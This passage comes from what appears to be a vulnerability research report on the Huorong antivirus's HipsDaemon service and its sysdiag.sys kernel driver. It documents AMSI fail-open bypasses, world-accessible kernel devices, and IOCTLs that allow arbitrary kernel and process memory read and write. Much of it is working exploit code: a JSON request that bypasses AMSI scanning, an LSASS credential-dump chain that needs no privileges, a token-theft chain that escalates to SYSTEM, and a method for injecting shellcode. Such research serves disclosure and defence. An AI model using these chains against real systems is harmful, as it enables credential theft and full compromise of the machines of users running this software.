1. `sub_140040E90(pid)` fails — PID is invalid, process doesn't exist, or `OpenProcess` fails
2. Process path string is empty after resolution

Since the `ScanAmsiStream` method is exposed on the world-accessible pipe (`HIPS_FILEMAPBLOCK_SERVER_NAME`, S-1-1-0 = Everyone = GENERIC_ALL), any local user can trigger this:

```json
{"jsonrpc":"2.0","method":"ScanAmsiStream",
 "params":{"pid":99999,"name":"x","size":1,"appname":"x","contentname":"","session":0},
 "id":1}
```

`pid=99999` → `sub_140040E90(99999)` → `OpenProcess` fails → `v5=0` → else → `v8=1` → `sub_14003A670` returns `json_pack("detected":0)` → **CLEAN without scanning**.

#### Race Condition Attack

Even in legitimate usage, a TOCTOU race applies:
1. `hramsi.dll::CAmsiScanner::Scan()` sends `ScanAmsiStream` with `pid = GetCurrentProcessId()`
2. **Before HipsDaemon processes the request**, the process could terminate (or another process could be created with the same PID)
3. HipsDaemon's `OpenProcess(pid)` → either fails (process gone) or resolves to a different process
4. Either way → path lookup fails or returns wrong path → possibly excluded → CLEAN

Practical attack: start short-lived processes that trigger AMSI scanning (e.g., PowerShell one-liners), terminated before HipsDaemon can resolve their PID → scanning bypassed.

---

### 31.2 Flaw 21 — ScanAmsiStream Handler: Three Pre-Scan Fail-Open Conditions

**Severity: MEDIUM** — Multiple global-state conditions short-circuit AMSI scanning to CLEAN.

#### Root Cause

`sub_14003A670` (scan result builder) @ `0x14003A670` checks three global-state conditions before any scan:

```c
// Condition 1: scan engine global config flag
if (!*(DWORD*)(sub_14003DF80() + 32))
    return json_pack("{s:b,s:i,s:b}", "detected", 0, "timeout", 0, "default", 0);

// Condition 2: scanner-specific config flag
if (!*(DWORD*)(sub_140040570() + 24))
    return json_pack("{s:b,s:i,s:b}", "detected", 0, "timeout", 0, "default", 0);

// Condition 3: PID in exclusion list (see Flaw 20)
if ((unsigned int)sub_140040870(scanner_ctx, pid))
    return json_pack("{s:b,s:i,s:b}", "detected", 0, "timeout", 0, "default", 0);
```

**Condition 1 (`engine+32`)**: Represents the Huorong "real-time monitor" enabled flag. Can be cleared by:
- Direct registry write to Huorong's configuration (already protected — but see Flaw 9: `sysdiag\conf` registry key is unprotected, and the config at `engine+32` may be read from a similar unprotected key)
- Writing the engine object in memory (via AMD Ryzen Master arbitrary physical R/W from §1-2)

**Condition 2 (`scanner+24`)**: Scanner-specific enabled flag. Same attack surface.

If EITHER flag is 0, ALL `ScanAmsiStream` requests return `{"detected":0,"timeout":0,"default":0}` — complete AMSI bypass.

---

### 31.3 Flaw 22 — Scan Dispatch: Hardcoded Bypass + Content-Name Allowlist

**Severity: LOW-MEDIUM** — Two bypass paths in the actual scan logic reduce detection coverage.

#### Root Cause (a): Hardcoded "Rogue/LNK.Promotion" Exception

`sub_140039A00` @ `0x14003A000`:

```c
v8 = (const char *)(a3 + 16);  // context type string
if (!strcmp(v8, "Rogue/LNK.Promotion"))
    return json_pack("{s:b,s:i,s:b}", "detected", 0, "timeout", 0, "default", 0);
```

If the scan context type string equals `"Rogue/LNK.Promotion"`, the scan result is hardcoded to CLEAN. This is a specific detection class bypass. In normal AMSI flow `v8 == "hrAmsiutils"` so this doesn't trigger, but it indicates a deliberate allowlisting for one threat category.

#### Root Cause (b): `"!submit"` Suffix → Sample Submission, No Block

```c
if (strstr(v8, "!submit"))
{
    sub_1400A7F00();    // initiate sample submission
    sub_1400A80E0(...);
    goto LABEL_69;      // → return CLEAN (no block, no detection response)
}
```

If the scan context string contains `"!submit"`, HipsDaemon routes the content to its sample submission backend instead of returning a detection verdict. The `ScanAmsiStream` response is CLEAN. This means:
- Any content tagged `"!submit"` in the scan metadata → forwarded to Huorong cloud, not blocked locally
- An attacker who can append `"!submit"` to the contentname/appname fields (via JSON param injection) could bypass local detection

#### Root Cause (c): Content-Name Allowlist Check

```c
v41 = sub_1400ADD90();            // get allowlist object
if (!(unsigned int)sub_1400ADF20(v41, v58))  // content name in allowlist?
{
    // NOT in allowlist → run scan → if detected: send event + return detected=1
    sub_1400394D0(a1, result, scanner, 0);
    return json_pack("{s:b,s:i,s:b}", "detected", 1, "timeout", 0, "default", 0);
}
// else → CLEAN (content name is in the allowlist)
goto LABEL_69;  // → CLEAN
```

The content name (`v58`) is built from either `contentname` or `appname` from the JSON params. An attacker with control over `hramsi.dll`'s JSON construction (e.g., via DLL injection or AMSI patching in their process) can set the content name to a value in Huorong's allowlist → all scans return CLEAN.

---

### 31.4 Flaw 23 — CreateFileMap: No ERROR_ALREADY_EXISTS Check → Memory Sharing Attack

**Severity: MEDIUM** — Attacker can pre-create named file mappings; HipsDaemon maps them without checking for pre-existing handles.

#### Root Cause

`sub_140008470` @ `0x140008470` creates the file mapping:

```c
// 1. Create mutex: "mapname_MUTEX"
HANDLE hMutex = CreateMutexA(secAttribs, FALSE, Name);  // Name = mapname + "_MUTEX"
*(_QWORD *)(a1 + 24) = hMutex;
if (hMutex)
{
    // 2. Create file mapping — NO DUPLICATE CHECK
    HANDLE hMap = CreateFileMappingA(
        INVALID_HANDLE_VALUE,    // anonymous backing
        secAttribs,              // security attrs from HipsDaemon's SYSTEM context
        PAGE_READWRITE,          // read/write
        (size+8) >> 32,          // size high
        (DWORD)(size+8),         // size low
        mapname);                // ← attacker-controlled name
    *(_QWORD *)a1 = hMap;
    
    // NO: if (GetLastError() == ERROR_ALREADY_EXISTS) { CloseHandle; fail; }
    
    if (hMap)
    {
        void *pView = MapViewOfFile(hMap, FILE_MAP_WRITE|FILE_MAP_READ, 0, 0, 0);
        *(_QWORD *)(a1 + 40) = pView;
        *pView = size;           // write size to first 8 bytes of attacker's mapping!
    }
}
```

**`CreateFileMappingA` with a name that already exists returns the existing handle with `GetLastError() == ERROR_ALREADY_EXISTS`.** The code ignores this — it proceeds to `MapViewOfFile` on the already-existing mapping.

#### Attack

Combined with Flaw 16 (world-accessible pipe → `CreateFileMap` → SYSTEM creates any named mapping):

```
[T=0] Attacker calls CreateFileMap("SCAN_RESULT_0001", 16) via world-accessible pipe
      → HipsDaemon creates Global\SCAN_RESULT_0001 mapping (size=24 bytes) as SYSTEM
      → Attacker gets a handle to this mapping (by opening it with OpenFileMapping)

[T=1] HipsDaemon's internal code calls sub_140008470(ctx, "SCAN_RESULT_0001", 65536)
      → CreateFileMappingA("SCAN_RESULT_0001", 65536) → returns EXISTING handle (ERROR_ALREADY_EXISTS, ignored)
      → MapViewOfFile on the 24-byte mapping → HipsDaemon maps 24 bytes
      → Writes size=65536+8 to pView[0] → writes 8 bytes to attacker's 24-byte mapping ✓
      
[T=2] HipsDaemon tries to write scan data beyond 8 bytes into this mapping
      → Access violation (the mapping is only 24 bytes, not 65544)
      → HipsDaemon crashes OR silently truncates scan data
      
[T=3] Attacker reads the mapping: sees HipsDaemon wrote the size field
      → Attacker knows HipsDaemon is using this mapping name
      → On next scan: attacker pre-writes CLEAN result into the mapping
```

**Net effect**: Denial of service against HipsDaemon's scan infrastructure; potential scan result injection if the mapping format is known.

#### Naming the Specific Mappings

The exact mapping names used internally by HipsDaemon are not yet fully enumerated. The `CreateFileMap` pipe method allows the attacker to experiment: create mappings with guessed names and observe whether HipsDaemon's internal code opens them (detectable by timing or process handle enumeration).

---

## 32. New Flaws Discovered — Session 3 (World-Accessible Kernel Devices)

> All findings come from IDA analysis of `sysdiag.sys` device creation (`sub_14000BDB0`, `sub_14000D260`, `sub_14005EB00`, `sub_140060580`) and IOCTL handler `sub_14005EDA0`.

---

### 32.1 Flaw 24 — CRITICAL: All sysdiag.sys Device Objects Created with Everyone=GENERIC_ALL DACL

**Severity: CRITICAL** — Any unprivileged local user can open and issue IOCTLs to Huorong's kernel driver devices.

#### Root Cause

`sub_14000BDB0` @ `0x14000BDB0` — device creation helper called for ALL Huorong devices:

```c
RtlInitUnicodeString(&DefaultSDDLString, L"D:P(A;;GA;;;WD)");
//                                            ↑ GA = GENERIC_ALL
//                                                    ↑ WD = S-1-1-0 = Everyone

WdmlibIoCreateDeviceSecure(
    DriverObject,
    0,                    // no extension
    DeviceName,
    FILE_DEVICE_UNKNOWN,  // 0x22
    0x100,                // FILE_DEVICE_SECURE_OPEN
    FALSE,                // non-exclusive
    &DefaultSDDLString,   // ← Everyone GENERIC_ALL
    NULL,
    &DeviceObject
);
```

This SDDL is applied to **every** device created via this helper:

| Device Name | Symbolic Link | Exposed Via |
|-------------|--------------|-------------|
| `\Device\HR::Base` | `\??\HR::Base` | `\\\\.\\HR::Base` |
| `\Device\HR::ActMon` | `\??\HR::ActMon` | `\\\\.\\HR::ActMon` |
| `\Device\HR::DTrampo` | `\??\HR::DTrampo` | `\\\\.\\HR::DTrampo` |
| `\Device\SysDiag::IOKit` | `\??\SysDiag::IOKit` | `\\\\.\\SysDiag::IOKit` |
| `\Device\nxeng` | `\??\nxeng` | `\\\\.\\nxeng` |

Any process (including low-integrity sandboxed processes) can:
```c
HANDLE h = CreateFileA("\\\\.\\SysDiag::IOKit",
    GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
// → SUCCEEDS as any local user, any integrity level
```

No privilege check anywhere in the device stack — access is fully controlled by the DACL alone.

---

### 32.2 Flaw 25 — CRITICAL: IOCTL 0x228050 Allocates Physical Pages and Returns Kernel VA to Unprivileged User

**Severity: CRITICAL** — Any local user obtains a kernel-space virtual address and can write to the same physical memory from user space, forming a complete user→kernel memory bridge.

#### Root Cause

`sub_14005F520` @ `0x14005F520`, called from IOCTL handler @ `0x14005F43E`:

```c
// IOCTL code: 0x228050 = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x14, METHOD_BUFFERED, FILE_WRITE_ACCESS)
// Input: user buffer [0..3] = DWORD page_count
// Output: user buffer [0..19] = page_count + user_VA + kernel_VA

__int64 __fastcall sub_14005F520(int page_count)
{
    // Safety: reject if called from kernel mode
    if (page_count <= 0 || !ExGetPreviousMode())
        return 0;

    PEPROCESS caller = IoGetCurrentProcess();
    ObfReferenceObject(caller);

    // 1. Allocate physical pages in LOW 4GB (0-4GB range)
    PMDL pMdl = MmAllocatePagesForMdl(
        {.QuadPart=0},              // LowAddress = 0
        {.QuadPart=0xFFFFFFFF},     // HighAddress = 4GB-1
        {.QuadPart=0},              // SkipBytes = 0
        page_count << 12            // TotalBytes = pages * 4096
    );

    if (pMdl && pMdl->ByteCount == page_count << 12)
    {
        // 2. Map to KERNEL address space (non-cached)
        PVOID kernel_va = MmMapLockedPagesSpecifyCache(
            pMdl, KernelMode, MmNonCached, NULL, FALSE, priority);

        // 3. Map THE SAME PHYSICAL PAGES to USER address space
        PVOID user_va = MmMapLockedPagesSpecifyCache(
            pMdl, UserMode, MmNonCached, NULL, FALSE, priority);

        // 4. Build descriptor
        descriptor = alloc(56);
        descriptor[+16] = pMdl;      // MDL
        descriptor[+24] = caller;    // calling process
        descriptor[+32] = page_count; // DWORD
        descriptor[+36] = user_va;   // QWORD: user-mode VA
        descriptor[+44] = kernel_va; // QWORD: kernel-mode VA
        return descriptor;
    }
}

// IOCTL 0x228050 returns to caller:
//   output[0..3]  = page_count
//   output[4..11] = user_va   (user-mode virtual address)
//   output[12..19]= kernel_va (kernel-mode virtual address)  ← LEAKED!
```

#### Impact

1. **Kernel Pool KASLR Bypass**: The returned `kernel_va` is a kernel virtual address from the pool allocator. An attacker can compute the kernel pool region's KASLR slide from this VA, defeating KASLR for pool-based exploitation.

2. **User-to-Kernel Memory Bridge**: The user-space `user_va` and `kernel_va` map the SAME physical pages (same MDL). Writing to `user_va[i]` is equivalent to writing to `kernel_va[i]` — same physical memory, observed from both sides. Any data written at user space appears at the kernel virtual address.

3. **Physical Memory in Low 4GB**: `MmAllocatePagesForMdl` with `HighAddress = 0xFFFFFFFF` restricts allocation to physical addresses 0-4GB. These pages are DMA-compatible and useful for additional low-level exploits.

4. **No Cleanup If Process Exits Without Calling 0x228054**: The MDL and both VA mappings persist attached to the calling EPROCESS. If the process exits without calling IOCTL 0x228054 (remove), the MDL is leaked (no MDL cleanup on process exit) — pool exhaustion DoS.

#### Full Attack Chain

```c
// Exploit: any unprivileged user process

HANDLE hDev = CreateFileA("\\\\.\\SysDiag::IOKit",
    GENERIC_ALL, 0, NULL, OPEN_EXISTING, 0, NULL);

// IOCTL 0x228050: allocate 1 page
struct { DWORD page_count; PVOID user_va; PVOID kernel_va; } io_buf;
io_buf.page_count = 1;  // 4096 bytes
DWORD returned;
DeviceIoControl(hDev, 0x228050, &io_buf, sizeof(io_buf),
                &io_buf, sizeof(io_buf), &returned, NULL);

// io_buf.user_va   = writable user-space pointer to the physical page
// io_buf.kernel_va = LEAKED kernel-space VA of the same physical page

// Primitive 1: KASLR info — kernel VA known
printf("Kernel VA: %p (pool KASLR slide derivable)\n", io_buf.kernel_va);

// Primitive 2: User writes → appear at kernel_va
memcpy(io_buf.user_va, shellcode, shellcode_len);
// → shellcode bytes now at kernel_va, executable if mapped as executable
// (MDL default: MmNonCached but RWX depends on page table bits)
```

---

### 32.3 Flaw 26 — SysDiag::IOKit IOCTL Table: 18 IOCTLs Callable by Any User Without Privilege Check

**Severity: HIGH** — Rich IOCTL interface to kernel objects accessible without elevation.

#### IOCTL Map (`sub_14005EDA0` @ `0x14005EDA0`)

All codes in format `CTL_CODE(0x22, func, METHOD_BUFFERED, access)`:

| IOCTL Code | Hex | Access | Function | Action |
|------------|-----|--------|----------|--------|
| `2228224` | `0x220400` | ANY | 256 | Get driver version → output `DWORD 0x20000` |
| `2260996` | `0x228004` | WRITE | 1 | Open kernel object handle (`sub_14005D640`) → object descriptor |
| `2261000` | `0x228008` | WRITE | 2 | Object op: read via `sub_14005DA90` |
| `2261004` | `0x22800C` | WRITE | 3 | Object op: write via `sub_14005DCB0` |
| `2228240` | `0x220410` | ANY | 260 | Object op: `sub_14005D7D0` |
| `2261012` | `0x228014` | WRITE | 5 | Object op: `sub_14005DE50` |
| `2261016` | `0x228018` | WRITE | 6 | Object op: `sub_14005D5A0` |
| `2228252` | `0x22041C` | ANY | 263 | Object op: `sub_14005DC80` |
| `2261024` | `0x228020` | WRITE | 8 | Object op: `sub_14005D430` |
| `2228260` | `0x220424` | ANY | 265 | Object close: `sub_14005D3F0` + `sub_14005D010` |
| `2261032` | `0x228028` | WRITE | 10 | Alloc type-A object: `sub_14005CA00` → register |
| `2261036` | `0x22802C` | WRITE | 11 | Alloc type-B object: `sub_14005C9F0` → register |
| `2261040` | `0x228030` | WRITE | 12 | Object op: `sub_14005CB90` (state=1 required) |
| `2228276` | `0x220434` | ANY | 269 | Object op: `sub_14005CA10` (state=1 required) |
| `2228280` | `0x220438` | ANY | 270 | Object close: `sub_14005C9B0` + `sub_14005D010` |
| `2228284` | `0x22043C` | ANY | 271 | `sub_14005EA00` — complex op |
| `2228288` | `0x220440` | ANY | 272 | `sub_14005E740` |
| `2228292` | `0x220444` | ANY | 273 | `sub_14005E6C0` |
| `2261064` | `0x228048` | WRITE | 18 | `sub_14005FD30` |
| `2261068` | `0x22804C` | WRITE | 19 | `sub_14005FD70` |
| `2261072` | `0x228050` | WRITE | 20 | **Physical page alloc + dual mapping (Flaw 25)** |
| `2261076` | `0x228054` | WRITE | 21 | Remove allocation by ID from linked list |

None of these IOCTLs check whether the caller is SYSTEM, Admin, or holds `SeLoadDriverPrivilege` or `SeDebugPrivilege`. The DACL-level `FILE_WRITE_ACCESS` requirement for `0x228xxx` IOCTLs is satisfied by the `GENERIC_ALL` grant in the DACL.

#### IOCTL 0x228004 — Kernel Object Handle from User Address

`sub_14005D640` wraps `sub_1400601C0` (likely `ObOpenObjectByPointer` or `ZwOpenFile`/`ZwOpenSection`):

```c
// Validates user memory first:
if (ExGetPreviousMode() == 1 && !sub_14000C990(a1, CheckUserMemoryAccess))
    return NULL;

// Flags field (a2) controls access mode:
// a2 & 0x100 → file object open path
// a2 & 0x200 → alternate access
// a2 & 0x400 → variant
// a2 & 2     → section-like
// a2 & 1     → another variant

// Opens object via sub_1400601C0(handle_out, a1_addr, access, ...):
HANDLE h;
PVOID obj;
sub_1400601C0(&h, a1, access_mask, 128, objectType, v7, flags, &obj);
```

With a user-controlled address `a1` and flags `a2`, this opens a kernel object and returns a descriptor with the handle and object pointer. An attacker can use this to open any kernel object reachable at a specific address — useful for escalation if combined with a kernel address disclosure (e.g., from Flaw 25).

---

---

## §33 — Arbitrary Kernel R/W and Process Memory R/W via SysDiag::IOKit (Flaws 27–29)

**Date analyzed:** 2026-06-05  
**Source:** `sysdiag.sys` — IOCTLs 0x228048 and 0x22804C in `sub_14005EDA0`  
**Impact: CRITICAL** — Any local (non-admin) user achieves arbitrary kernel virtual memory read/write and LSASS credential dump without `SeDebugPrivilege` or `OpenProcess`.

---

### 33.1 Flaw 27 — CRITICAL: IOCTL 0x228048 — Arbitrary Kernel VA Read + Arbitrary Process Memory Read

**Severity: CRITICAL** — Complete read primitive over all kernel memory and all process address spaces, accessible from any user account.

#### Handler Chain

```
IOCTL 0x228048 (CTL_CODE(0x22, 0x12, METHOD_BUFFERED, FILE_WRITE_ACCESS))
  → sub_14005EDA0 case 0x228048
  → sub_14005FD30(a1=PID_or_zero, a2=src_addr, a3=dst_buf, a4=size)
      if (a1 != 0) → sub_14005FAD0   ← process memory read
      if (a1 == 0) → sub_14005F810   ← kernel VA read
```

#### Exact Input Buffer Layout (from `sub_14005EDA0` dispatch at 0x14005F3C3)

Both IOCTLs require minimum 0x1C (28) bytes for input and output:

```c
// IOCTL 0x228048 (read) input/output buffer (METHOD_BUFFERED):
struct HR_ReadRequest {
    DWORD  mode;          // [0..3]   0 = kernel VA read; non-zero = PID for process read
    QWORD  source_va;     // [4..11]  kernel VA (mode=0) or target-process VA (mode=PID)
    QWORD  out_buf_ptr;   // [12..19] user-mode pointer to destination buffer (data written here)
    DWORD  size;          // [20..23] byte count
    DWORD  use_mdl;       // [24..27] flag: 0=fast path if mapped, 1=always MDL
};
// Output [0..3] = DWORD NTSTATUS (0 on success)
// Actual data → *out_buf_ptr (not in system buffer!)

// IOCTL 0x22804C (write) input/output buffer:
struct HR_WriteRequest {
    DWORD  mode;          // [0..3]   0 = kernel VA write; non-zero = PID for process write
    QWORD  dest_va;       // [4..11]  kernel VA (mode=0) or target-process VA (mode=PID)
    QWORD  src_buf_ptr;   // [12..19] user-mode pointer to source data
    DWORD  size;          // [20..23] byte count (1/2/4/8 = atomic; other = memmove)
    DWORD  use_mdl;       // [24..27] flag: 0=error if not mapped, 1=force MDL
};
```

#### Mode 0: Arbitrary Kernel Virtual Memory Read (`a1 == 0`, `sub_14005F810`)

```c
__int64 __fastcall sub_14005F810(char *KernelSrc, void *UserDst, unsigned int size, int use_mdl)
{
    char *last_byte = &KernelSrc[size - 1];

    // Guard: fail if src is NOT in kernel range (MmSystemRangeStart = 0xFFFF800000000000)
    if (KernelSrc > last_byte || last_byte < MmSystemRangeStart
        || !CheckUserMemoryAccess(UserDst, size))
        return STATUS_INVALID_PARAMETER;  // ← only rejects USER-mode src, not kernel

    if (MmIsAddressValid(KernelSrc, size)) {
        // Fast path: kernel VA already mapped → direct copy
        memmove(UserDst, KernelSrc, size);  // ← NO BOUNDS, NO TYPE CHECK
        return STATUS_SUCCESS;
    }

    // Slow path: lock and map via MDL (handles paged-out kernel memory)
    PMDL mdl = IoAllocateMdl(KernelSrc, size, FALSE, FALSE, NULL);
    MmProbeAndLockPages(mdl, KernelMode, IoReadAccess);
    memmove(UserDst, KernelSrc, size);
    MmUnlockPages(mdl);
    IoFreeMdl(mdl);
    return STATUS_SUCCESS;
}
```

**Attack:** Supply any kernel VA (>= `MmSystemRangeStart`) as `KernelSrc`. The function validates only that `UserDst` is a valid user buffer — it performs zero validation on the source address beyond the kernel-range check. Any kernel VA readable by the system (pool, image sections, EPROCESS, HAL tables, etc.) is returned verbatim.

#### Mode 1: Arbitrary Process Memory Read — LSASS Dump Without OpenProcess (`a1 = PID`, `sub_14005FAD0`)

```c
__int64 __fastcall sub_14005FAD0(int pid, void *proc_src_va, void *dst_buf, int size)
{
    PEPROCESS target;
    PsLookupProcessByProcessId((HANDLE)pid, &target);  // ← NO privilege check on PID!

    if (sub_14000CA30(dst_buf, size)) {    // validate output buffer writable
        void *tmp = alloc(size);
        KAPC_STATE apc;

        KeStackAttachProcess(target, &apc);   // ← attach to ANY target process's CR3!
        if (CheckUserMemoryAccess(proc_src_va, size))
            memmove(tmp, proc_src_va, size);  // ← read from target's VA space!
        KeUnstackDetachProcess(&apc);

        memmove(dst_buf, tmp, size);          // ← return to user
        free(tmp);
        ObfDereferenceObject(target);
        return 0;
    }
}
```

**Critical impact:** The caller supplies an arbitrary PID and a virtual address within that process. The driver:
1. Calls `PsLookupProcessByProcessId` without any check that the caller has `SeDebugPrivilege` or even `PROCESS_VM_READ` access to the target.
2. Calls `KeStackAttachProcess` to switch to the target process's page table (CR3) — bypassing all address-space isolation.
3. Calls `memmove` to read from the target's VA space.
4. Returns the data to the unprivileged caller.

**LSASS dump chain:**
```c
HANDLE hDev = CreateFileA("\\\\.\\SysDiag::IOKit",
    GENERIC_ALL, 0, NULL, OPEN_EXISTING, 0, NULL);
// → succeeds for ANY local user (SDDL D:P(A;;GA;;;WD))

// Step 1: find LSASS PID (NtQuerySystemInformation, PROCESS_BASIC_INFORMATION, any unprivileged API)
DWORD lsass_pid = GetPidByName(L"lsass.exe");

// Step 2: walk LSASS VA space and read credential buffers
struct { DWORD pid; QWORD va; QWORD size; QWORD reserved; } req;
req.pid  = lsass_pid;
req.va   = LSASS_MODULE_BASE;   // or known secret VA from pattern scan
req.size = 0x1000;
BYTE out[0x1000];
DeviceIoControl(hDev, 0x228048, &req, sizeof(req), out, sizeof(out), &ret, NULL);
// → LSASS memory returned, no OpenProcess, no SeDebugPrivilege, no PPL bypass needed
```

This completely bypasses:
- Windows PPL (Protected Process Light) — the driver never calls `OpenProcess`
- EDR `ObRegisterCallbacks` on process open — never triggered
- LSASS runAsPPL — moot, because no handle is opened to LSASS
- Any userland hook on `NtReadVirtualMemory`

---

### 33.2 Flaw 28 — CRITICAL: IOCTL 0x22804C — Arbitrary Kernel VA Write + Arbitrary Process Write

**Severity: CRITICAL** — Complete write primitive, enabling kernel data patching (token theft, callback removal, dispatch table overwrite) and process injection without `WriteProcessMemory`.

#### Handler Chain

```
IOCTL 0x22804C (CTL_CODE(0x22, 0x13, METHOD_BUFFERED, FILE_WRITE_ACCESS))
  → sub_14005EDA0 case 0x22804C
  → sub_14005FD70(a1=PID_or_zero, a2=dst_addr, a3=src_buf, a4=size)
      if (a1 != 0) → sub_14005FC00   ← process memory write
      if (a1 == 0) → sub_14005F920   ← kernel VA write
```

#### Mode 0: Arbitrary Kernel Virtual Memory Write (`a1 == 0`, `sub_14005F920`)

```c
__int64 __fastcall sub_14005F920(char *KernelDst, __int32 *UserSrc, signed int size, int use_mdl)
{
    char *last_byte = &KernelDst[size - 1];
    if (KernelDst > last_byte || last_byte < MmSystemRangeStart
        || !CheckUserMemoryAccess(UserSrc, size))
        return STATUS_INVALID_PARAMETER;  // ← only rejects user-mode dst

    // If pages not already mapped, lock via MDL
    PMDL mdl = IoAllocateMdl(KernelDst, size, FALSE, FALSE, NULL);
    MmProbeAndLockPages(mdl, KernelMode, IoReadAccess);

    // Map the physical pages to a WRITABLE kernel mapping:
    void *writable = MmMapLockedPagesSpecifyCache(mdl, KernelMode, MmNonCached,
                                                  NULL, FALSE, priority);

    MmProtectMdlSystemAddress(mdl, PAGE_READWRITE);  // ← force writable!

    // Write to writable alias (modifies same physical pages as KernelDst):
    switch (size) {
        case 4:  InterlockedExchange((LONG*)writable, *UserSrc);       break; // atomic 4B
        case 8:  InterlockedExchange64((LONG64*)writable, *(LONG64*)UserSrc); break; // atomic 8B
        case 1:  *writable = *(BYTE*)UserSrc;                           break;
        case 2:  *(WORD*)writable = *(WORD*)UserSrc;                    break;
        default: memmove(writable, UserSrc, size);                      break;
    }

    MmUnmapLockedPages(writable, mdl);
    MmUnlockPages(mdl);
    IoFreeMdl(mdl);
    return STATUS_SUCCESS;
}
```

**Mechanism:** The function takes the physical pages backing any kernel virtual address, creates a NEW writable mapping of those same pages via `MmProtectMdlSystemAddress(PAGE_READWRITE)`, and writes to that alias. The modification appears immediately at `KernelDst` because both mappings reference the same physical memory.

**PatchGuard relevance:** PatchGuard monitors the original read-only or non-writable mappings of critical structures. Writing via an MDL alias bypasses the standard `CR0.WP` clear approach; whether PatchGuard catches the modification depends on whether it checks the data (it does for ntoskrnl code pages) or just the protection flags. For non-code data (kernel globals, EPROCESS fields, callback arrays), this write succeeds without triggering PatchGuard.

**HVCI note:** On systems with Hypervisor-Protected Code Integrity enabled, `MmProtectMdlSystemAddress(PAGE_READWRITE)` for kernel code pages will fail (HVCI enforces code page immutability at the hypervisor level). For kernel data pages and pool allocations — which cover all interesting exploitation targets below — HVCI does NOT interfere. HVCI is not enabled by default on most Huorong user systems.

#### LPE via Kernel Token Theft — Complete Exploit Chain

```c
// All from non-admin user process

HANDLE hDev = CreateFileA("\\\\.\\SysDiag::IOKit",
    GENERIC_ALL, 0, NULL, OPEN_EXISTING, 0, NULL);

// Step 1: Leak kernel VA via IOCTL 0x228050
struct PhysReq { DWORD pages; QWORD user_va; QWORD kernel_va; } phys;
phys.pages = 1;
DeviceIoControl(hDev, 0x228050, &phys, 4, &phys, 20, &ret, NULL);
PVOID kva_anchor = phys.kernel_va;  // known kernel pool VA → KASLR slide derived

// Step 2: Read nt!PsInitialSystemProcess using the anchor + known relative offset
// (kernel VA = known from Step 1, walk pool to find ntoskrnl base)
QWORD system_eprocess;
struct ReadReq { DWORD pid; QWORD src_kva; DWORD size; } rreq;
rreq.pid = 0;
rreq.src_kva = ntoskrnl_base + PsInitialSystemProcess_offset;
DeviceIoControl(hDev, 0x228048, &rreq, sizeof(rreq), &system_eprocess, 8, &ret, NULL);

// Step 3: Read SYSTEM EPROCESS.Token
QWORD system_token;
rreq.src_kva = system_eprocess + TOKEN_OFFSET;  // e.g., EPROCESS+0x4B8 on W11 22H2
DeviceIoControl(hDev, 0x228048, &rreq, sizeof(rreq), &system_token, 8, &ret, NULL);

// Step 4: Find current process EPROCESS (IoGetCurrentProcess via known PID)
QWORD my_eprocess;
rreq.src_kva = /* walk process list from system_eprocess */ ...;
// OR: use IOCTL 0x228048 mode 1 to call IoGetCurrentProcess indirectly

// Step 5: Overwrite current process Token with SYSTEM token
struct WriteReq { DWORD pid; QWORD dst_kva; DWORD size; QWORD value; } wreq;
wreq.pid = 0;
wreq.dst_kva = my_eprocess + TOKEN_OFFSET;
wreq.size = 8;
wreq.value = system_token;
DeviceIoControl(hDev, 0x22804C, &wreq, sizeof(wreq), NULL, 0, &ret, NULL);
// → current process now runs as SYSTEM
```

#### Mode 1: Arbitrary Process Memory Write — Injection Without WriteProcessMemory (`a1 = PID`, `sub_14005FC00`)

```c
__int64 __fastcall sub_14005FC00(int pid, __int64 target_va, void *src_buf, int size)
{
    PEPROCESS target;
    PsLookupProcessByProcessId((HANDLE)pid, &target);  // NO privilege check

    if (CheckUserMemoryAccess(src_buf, size)) {
        HANDLE hProc;
        ObOpenObjectByPointer(target, OBJ_KERNEL_HANDLE,
                              NULL, PROCESS_ALL_ACCESS, NULL, KernelMode, &hProc);

        void *tmp = alloc(size);
        memmove(tmp, src_buf, size);
        sub_14005F670(hProc, target, target_va, tmp, size);  // ZwWriteVirtualMemory or MmCopyVirtualMemory
        free(tmp);
        ZwClose(hProc);
        ObfDereferenceObject(target);
        return 0;
    }
}
```

Supply PID + target VA + data → the driver writes to any process's address space. The `ObOpenObjectByPointer` is called with `KernelMode` (bypasses object access checks) and `PROCESS_ALL_ACCESS`. No user-mode access check, no PPL check, no `SeDebugPrivilege` requirement.

**Injection chain:** supply PID of target (e.g., explorer.exe, svchost), a VA of an existing RWX region in that process, and shellcode bytes → remote code injection without `OpenProcess`/`WriteProcessMemory`/`CreateRemoteThread`.

---

### 33.3 Sixth World-Accessible Device: SysDiag::SysUtils + IOCTL 0x220060 Kernel Stack Disclosure (Flaw 29)

**Severity: HIGH** — Sixth device created with `SDDL "D:P(A;;GA;;;WD)"` containing 20+ IOCTLs; one handler writes uninitialized kernel stack to user output.

#### Device Creation

`sub_1400625A0` @ `0x1400625A0` creates the sixth world-accessible device:
```c
sub_14000BDB0(driver, L"\\Device\\SysDiag::SysUtils", L"\\??\\SysDiag::SysUtils", &devobj);
// → same SDDL "D:P(A;;GA;;;WD)" = Everyone GENERIC_ALL
a1[18] = sub_1400627D0;  // IOCTL handler
```

Complete device table updated:

| Device Name | Win32 Path | Created By |
|-------------|------------|------------|
| `\Device\HR::Base` | `\\.\HR::Base` | `sub_14000D260` |
| `\Device\HR::ActMon` | `\\.\HR::ActMon` | `sub_14000D260` |
| `\Device\HR::DTrampo` | `\\.\HR::DTrampo` | `sub_14000D260` |
| `\Device\SysDiag::IOKit` | `\\.\SysDiag::IOKit` | `sub_14005EB00` |
| `\Device\nxeng` | `\\.\nxeng` | `sub_140060580` |
| `\Device\SysDiag::SysUtils` | `\\.\SysDiag::SysUtils` | `sub_1400625A0` |

#### IOCTL 0x220060 — Uninitialized Kernel Stack Disclosure (`sub_1400627D0` case 2228320)

```c
// sub_1400627D0 local variables:
__int64 v23;  // [rsp+70h] [rbp+18h] BYREF  ← NEVER INITIALIZED
__int64 v24;  // [rsp+78h] [rbp+20h] BYREF  ← NEVER INITIALIZED

case 2228320:  // IOCTL 0x220060 = CTL_CODE(0x22, 0x18, METHOD_BUFFERED, ANY)
    if (!v5 || (unsigned int)v7 < 0x10 || v8 < 0x10)
        return error;
    sub_1400611D0((HANDLE)*v5);   // some cleanup op with user-supplied handle
    *v5 = v23;      // ← write [rsp+70h] to output buffer
    v5[1] = v24;    // ← write [rsp+78h] to output buffer
    break;
```

